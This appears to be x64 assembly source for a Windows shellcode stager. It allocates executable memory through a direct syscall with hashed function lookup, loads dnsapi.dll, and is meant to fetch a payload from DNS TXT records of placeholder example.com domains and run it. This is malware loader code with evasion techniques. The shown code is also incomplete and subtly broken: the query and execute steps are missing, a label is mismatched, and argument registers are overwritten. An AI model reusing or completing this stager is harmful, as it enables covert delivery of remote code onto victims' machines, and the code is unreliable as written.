[BITS 64]

%define bBaseAddr   [rbp]
%define bRegionSize [rbp + 8]

MEM_COMMIT                      equ 0x1000
MEM_RESERVE                     equ 0x2000
PAGE_EXECUTE_READWRITE          equ 0x40
ZWALLOCATEVIRTUALMEMORY_HASH    equ 0xD33D4AED
LOADLIBRARYA_HASH               equ 0xEC0E4E8E


; step 1: call ZwAllocateVirtualMemory to allocate some memory for our stager
; step 2: load dnsapi.dll and get the address of DnsQuery_A
; step 3: call DnsQuery_A for each of the domains in the list above and write the results to the memory we allocated in step 1
; step 4: jump to the memory we allocated in step 1 to execute the stager payload

dns_txt_stager:
    cld                                     ; Clear the direction flag to ensure string operations work as expected
    push rbp                                ; save rbp
    mov rbp, rsp                            ; set stack frame
    sub rsp, 0x100                          ; allocate space on the stack for local variables
    and rsp, 0xfffffffffffffff0             ; align the stack to 16 bytes
    push r12                                ; save r12
    push r13                                ; save r13
    push r14                                ; save r14
    push r15                                ; save r15
    call .direct_syscall_x64                ; Call the direct syscall stub
    %include "block_direct_syscall_x64.asm"
.direct_syscall_x64:
    pop rbx

; NTSYSAPI NTSTATUS ZwAllocateVirtualMemory(
;   [in]      HANDLE    ProcessHandle,
;   [in, out] PVOID     *BaseAddress,
;   [in]      ULONG_PTR ZeroBits,
;   [in, out] PSIZE_T   RegionSize,
;   [in]      ULONG     AllocationType,
;   [in]      ULONG     Protect
; );
; ZwAllocateVirtualMemory(-1, &BaseAddress, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
.allocate_memory:
    mov     rcx, 0xffffffffffffffff             ; -1 for ProcessHandle to indicate current process
    lea     rdx, [bBaseAddr]                    ; &BaseAddress
    xor     r8, r8                              ; ZeroBits = 0
    lea     r9, [bRegionSize]                   ; &RegionSize
    mov     r8, MEM_COMMIT | MEM_RESERVE        ; AllocationType = MEM_COMMIT | MEM_RESERVE
    mov     r9, PAGE_EXECUTE_READWRITE          ; Protect = PAGE_EXECUTE_READWRITE
    mov     r10d, ZWALLOCATEVIRTUALMEMORY_HASH  ; Hash of ZwAllocateVirtualMemory
    call    rbx                                 ; Call the direct syscall stub
    add     rsp, 0x40                           ; Clean up the shadow space
    test    rax, rax                            ; Check if the syscall succeeded
    jnz     .exit                               ; If it failed, exit
.dnsapi_str:
    call load_dnsapi
    db "dnsapi.dll", 0

; LoadLibraryA("dnsapi.dll");
.load_dnsapi:
    pop rcx                                     ; Get the return address (which points to the string "dnsapi.dll") into rcx
    mov r10d, LOADLIBRARYA_HASH                 ; Hash of LoadLibraryA
    call rbx                                    ; Call the direct syscall stub to get the address of LoadLibraryA


.exit:
    pop r15                                 ; restore r15
    pop r14                                 ; restore r14
    pop r13                                 ; restore r13
    pop r12                                 ; restore r12
    mov rsp, rbp                            ; restore stack pointer
    pop rbp                                 ; restore base pointer
    ret                                     ; return to caller

domains:
    db "one.example.com", 0
    db "two.example.com", 0
    db "three.example.com", 0
    db "four.example.com", 0
    db "five.example.com", 0